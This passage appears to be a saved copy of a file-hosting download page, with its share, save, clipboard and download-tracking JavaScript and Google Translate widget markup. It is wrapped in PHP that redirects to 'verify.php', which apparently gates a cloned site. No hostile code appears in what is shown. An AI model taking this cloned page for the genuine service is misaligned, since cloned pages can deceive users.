      for (var i = 0; i < uiDropdowns.length; i++) {
        uiDropdowns[i].classList.remove('show_dropdown');
      }
    }
  }

  function toggleDropdown(dropdown) {
    return function(e) {
      if (dropdown.classList.contains('show_dropdown')) {
        dropdown.classList.remove('show_dropdown');
      } else {
        e.preventDefault();
        dropdown.classList.add('show_dropdown');
        setTimeout(function() {
          document.addEventListener('click', clickOutside);
        }, 0);
      }
    };
  }

  // Events
  if (uiButtonLogout) {
    uiButtonLogout.onclick = function(e) {
      e.preventDefault();
      if (uiIframeWorker)
        uiIframeWorker.src = e.target.href;
      return false;
    }
  }

  if (uiDropdowns) {
    for (var i = 0; i < uiDropdowns.length; i++) {
      uiDropdowns[i].onclick = toggleDropdown(uiDropdowns[i]);
    }
  }

  if (uiStatusContainer) {
    window.closeStatusMessage = function() {
      if (stateTimerStatus) {
        clearTimeout(stateTimerStatus);
        stateTimerStatus = null;
      }
      uiStatusMessage.innerText = '';
      uiStatusMessage.textContent = '';
      uiStatusContainer.style.display = 'none';
    }

    window.showStatusMessage = function(message) {
      uiStatusMessage.innerText = message;
      uiStatusMessage.textContent = message;
      uiStatusContainer.style.display = 'block';
      setTimeout(closeStatusMessage, 3500);
    }

    uiStatusContainer.onclick = function(e) {
      e.preventDefault();
      closeStatusMessage();
    };
  }

  // Keyboard focus styling
  try {
    document.addEventListener('keydown', function(e) {
      if (e.keyCode === 9) {
        document.body.classList.add('show-focus-outlines');
      }
    });

    document.addEventListener('click', function(e) {
      document.body.classList.remove('show-focus-outlines');
    });
  } catch (e) {}
})();

(function() {
  // Options
  var optFileKey = "dixx8s1n5ihyqla";
  var optFileName = "#";
  var optFileURL = "#";
  var optLoggedIn = "false" === "true";
  var optReportTurboDL = "true" === "true";
  var optSecurityToken = "1689533690.80c0508fc16d4acaeb05dca5907677d613e95ff934a4f5ffb932e6dee8d9f2f5";
  var optJsDirectLink = "false" === "true";
  var optTurboDownload = "false" === "true";

  // Elements
  var elWrapperAd = document.getElementById('non-dl-content');
  var elWrapperShare = document.getElementById('share');
  var elCloseShare = document.getElementById('share-close');
  var elIframeShare = document.getElementById('share-iframe');
  var elShare = document.getElementById('shareButton');
  var elSave = document.getElementById('saveButton');
  var elSaveParallel = document.getElementById('saveButtonParallel');
  var elCopyLink = document.getElementById('copyShareURL');
  var elCopyLinkMobile = document.getElementById('copyShareURLMobile');
  var elTurboDownloadOptIn = document.getElementById('ParallelDL-optIn');
  var elCloseMobileTD = document.getElementById('mobile-turbo-dl-btn-close');
  var elEnableMobileTD = document.getElementById('mobile-turbo-dl-btn-enable');
  var elCancelMobileTD = document.getElementById('mobile-turbo-dl-btn-cancel');

  // State
  var alwaysReloadShareBox = true;
  var stateShareBoxLoaded = false;
  elIframeShare.style.display = '';

  // Globals
  window.downloadOptIn = function() {
    document.cookie = "mf_tdl_x=1; path=/";
    window.trackTurboDownload('opt_in');
    window.location.reload();
  }

  window.showTDOptInDialog = function() {
    document.body.classList.add('modal-open');
    document.getElementById('mobile-turbo-dl-enable').style = 'display:block !important';
  }

  window.closeMobileTD = function(src) {
	  src && src.preventDefault();
	  try {
		  document.body.classList.remove('modal-open');
		  document.getElementById('mobile-turbo-dl-enable').style = '';
	  } catch(e) { }
  }

  window.addEventListener("message", function(e) {
    if (e && e.data === 'mf-close-dialogs') {
      closeShareDialog();
    }
  });

  window.trackTurboDownload = function(event, details) {
    if (!optReportTurboDL) return;
    try {
      var xhr = new XMLHttpRequest();
      var query = 'security=' + optSecurityToken + '&event=' + event;
      if (details) {
        query += '&connections=' + details.connections
          + '&speed_kbps=' + details.speed
          + '&duration=' + details.duration
          + '&filesize=' + details.filesize
          + '&go_experiment=' + (window.go_experiment || '');
      }
      xhr.open('POST', '/', true);
      xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
      xhr.send(query);
    } catch(e) {}
    try {
      gtag('event', event, {
        'event_category': 'turbo_download'
      });
    } catch (e) {}
  };

  window.showDesktopDownloadArrow = function() {
    try {
      if (navigator.userAgent.match(/Mobi/)) return;
      var div = document.createElement("div");
      div.id = 'download-arrow';
      document.body.appendChild(div);
      setTimeout(function() {div.style.opacity = 1}, 100);
    } catch(e) {}
  };

  window.hideDesktopDownloadArrow = function() {
    try {
      var div = document.getElementById('download-arrow');
      div.parentNode.removeChild(div);
    } catch(e) {}
  };

  window.onLegacyCopyLink = function(legacyLink) {
    copyShareLink(null, legacyLink);
  };

  window.openShareDialog = function(src) {
    src && src.preventDefault();
    document.body.classList.add('modal-open');
    elWrapperShare.style = 'display:block !important';
    if (alwaysReloadShareBox || !stateShareBoxLoaded) {
      elIframeShare.onload = function() {
        stateShareBoxLoaded = true;
      }
      elIframeShare.src = elIframeShare.getAttribute('data-src');
    }
  }

  window.saveToMyfiles = function(src) {
    src && src.preventDefault();
    if (!optLoggedIn) {
      window.location.href = '#';
      return;
    }
    var success = false;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
      try {
        success = JSON.parse(this.responseText).success;
      } catch (e) {
        success = false;
      }
      showStatusMessage(success
        ? 'Saved ' + optFileName + ' to your account!'
        : 'You do not have access to save ' + optFileName + ' to your account.');
    };
    xhr.send('security=' + optSecurityToken + '&quick_key=' + optFileKey);
    return false;
  }

  window.copyShareLink = function(src, altLink) {
    src && src.preventDefault();
    var targetLink = altLink || optFileURL;
    try {
      var iosCopyToClipboard = function(el) {
        var oldContentEditable = el.contentEditable,
          oldReadOnly = el.readOnly,
          range = document.createRange();
        el.contentEditable = true;
        el.readOnly = false;
        range.selectNodeContents(el);
        var s = window.getSelection();
        s.removeAllRanges();
        s.addRange(range);
        el.setSelectionRange(0, 999999);
        el.contentEditable = oldContentEditable;
        el.readOnly = oldReadOnly;
        document.execCommand('copy');
        document.activeElement.blur();
      };
      var copyListener = function(event) {
        document.removeEventListener('copy', copyListener, true);
        event.preventDefault();
        var clipboardData = event.clipboardData;
        clipboardData.clearData();
        clipboardData.setData('text/plain', targetLink);
        clipboardData.setData('text/html', targetLink);
      };
      iosCopyToClipboard(document.getElementById('copy')); // iOS workaround
      document.addEventListener('copy', copyListener, true);
      document.execCommand('copy');
      showStatusMessage('Share Link copied to the clipboard!');
    } catch(e) {
      window.prompt('Press CTRL+C to copy share link:', targetLink);
    }
    return false;
  }

  // Locals
  function closeShareDialog(src) {
    src && src.preventDefault();
    try {
      document.body.classList.remove('modal-open');
      elWrapperShare.style = '';
    } catch(e) { }
  }

  // Ad viewport events
  if (elWrapperAd && window.checkQueuedAdUnitViews) {
      function onScrollResizeChange() {
          var boundingRect = elWrapperAd.getBoundingClientRect();
          window.checkQueuedAdUnitViews({
              windowPageXOffset: - boundingRect.left,
              windowPageYOffset: - boundingRect.top,
              windowInnerWidth: window.innerWidth,
              windowInnerHeight: window.innerHeight
          });
      }
      window.addEventListener("scroll", onScrollResizeChange);
      window.addEventListener("resize", onScrollResizeChange);
      setTimeout(onScrollResizeChange, 1000);
      setTimeout(onScrollResizeChange, 3000);
  }

  // Lazy-loading
  window.startLazyLoad = function() {
    try {
      var observer;
      function setupObserver() {
        observer = new IntersectionObserver(function(obsList) {
          handleIntersection(obsList);
        }, {rootMargin: "10px 0px"});
        findLazyLoadElements();
      }
      function findLazyLoadElements() {
        var elements = document.getElementsByClassName('lazyload');
        for (var el of elements) {
          observer.observe(el);
        }
      }
      function handleIntersection(obsList) {
        for (var obs of obsList) {
          var el = obs.target;
          if (obs.isIntersecting) {
            var lazyClass = el.getAttribute('data-lazyclass');
            if (lazyClass) el.classList.add(lazyClass);
            var lazySource = el.getAttribute('data-lazysrc');
            if (lazySource && el.src !== lazySource) el.src = lazySource;
          }
        }
      }
      setupObserver();
    } catch(e) {
      var elements = document.getElementsByClassName('lazyload');
      for (var i = 0; i < elements.length; i++) {
        var el = elements[i];
        el.className += ' ' + el.getAttribute('data-lazyclass');
        var lazySource = el.getAttribute('data-lazysrc');
        if (lazySource && el.src !== lazySource) el.src = lazySource;
      }
    }
  };

  if (window.gtag) {
    gtag('event', 'optimize.callback', {
      callback: function(sVariants, sExperimentId) {
        window.go_experiment = sExperimentId + ':' + sVariants;
      }
    });
  }

  if (optJsDirectLink) {
    window.addEventListener('load',  function() {
      if (optTurboDownload) {
        var dlButton = document.getElementsByClassName('mftd-download').item(0);
		if (!dlButton) {
			dlButton = document.getElementsByClassName('mftd-mobile').item(0);
		}
      } else {
        var dlButton = document.getElementById('downloadButton');
      }
      if (dlButton) {
        dlButton.click();
      }
    });
  }

  // Events
  if (elShare) elShare.onclick = openShareDialog;
  if (elShareMobile) elShareMobile.onclick = openShareDialog;
  if (elWrapperShare) elWrapperShare.onclick = closeShareDialog;
  if (elCloseShare) elCloseShare.onclick = closeShareDialog;
  if (elSave) elSave.onclick = saveToMyfiles;
  if (elSaveMobile) elSaveMobile.onclick = saveToMyfiles;
  if (elSaveParallel) elSaveParallel.onclick = saveToMyfiles;
  if (elCopyLink) elCopyLink.onclick = copyShareLink;
  if (elCopyLinkMobile) elCopyLinkMobile.onclick = copyShareLink;
  if (elCloseMobileTD) elCloseMobileTD.onclick = closeMobileTD;
  if (elEnableMobileTD) elEnableMobileTD.onclick = downloadOptIn;
  if (elCancelMobileTD) elCancelMobileTD.onclick = closeMobileTD;
})();

})();</script> 

  <script type="text/javascript">
        window.startLazyLoad && window.startLazyLoad();  // No lazy ad positioning, fine to start lazy loader.
    </script> 
  <iframe name="__tcfapiLocator" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe>
  <iframe name="__uspapiLocator" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe>
  <iframe name="__gppLocator" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe>
  <iframe name="googlefcInactive" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe>
  <div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id="">
   <div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd">
    <div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c">
     <img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt="">
    </div>
    <div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c">
     <div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">
      Teks asli
     </div>
     <div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div>
    </div>
    <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr">
     <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr">
      <div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">
       Beri rating terjemahan ini
      </div>
      <div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">
       Masukan Anda akan digunakan untuk membantu meningkatkan kualitas Google Terjemahan
      </div>
     </div>
     <div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr">
      <button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Terjemahan bagus" aria-label="Terjemahan bagus" aria-pressed="false"><span id="goog-gt-thumbUpIcon">
        <svg width="24" height="24" viewbox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
         <path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path>
        </svg></span><span id="goog-gt-thumbUpIconFilled">
        <svg width="24" height="24" viewbox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
         <path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path>
        </svg></span></button>
      <button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Terjemahan buruk" aria-label="Terjemahan buruk" aria-pressed="false"><span id="goog-gt-thumbDownIcon">
        <svg width="24" height="24" viewbox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
         <path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path>
        </svg></span><span id="goog-gt-thumbDownIconFilled">
        <svg width="24" height="24" viewbox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
         <path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path>
        </svg></span></button>
     </div>
    </div>
    <div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce">
     <form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce">
      <input type="text" name="sl" id="goog-gt-votingInputSrcLang">
      <input type="text" name="tl" id="goog-gt-votingInputTrgLang">
      <input type="text" name="query" id="goog-gt-votingInputSrcText">
      <input type="text" name="gtrans" id="goog-gt-votingInputTrgText">
      <input type="text" name="vote" id="goog-gt-votingInputVote">
     </form>
     <iframe name="votingFrame" frameborder="0"></iframe>
    </div>
   </div>
  </div>
  <iframe name="googlefcLoaded" src="about:blank" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe>
  <div class="VIpgJd-ZVi9od-aZ2wEe-wOHMyf">
   <div class="VIpgJd-ZVi9od-aZ2wEe-OiiCO">
    <svg xmlns="http://www.w3.org/2000/svg" class="VIpgJd-ZVi9od-aZ2wEe" width="96px" height="96px" viewbox="0 0 66 66">
     <circle class="VIpgJd-ZVi9od-aZ2wEe-Jt5cK" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
    </svg>
   </div>
  </div>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>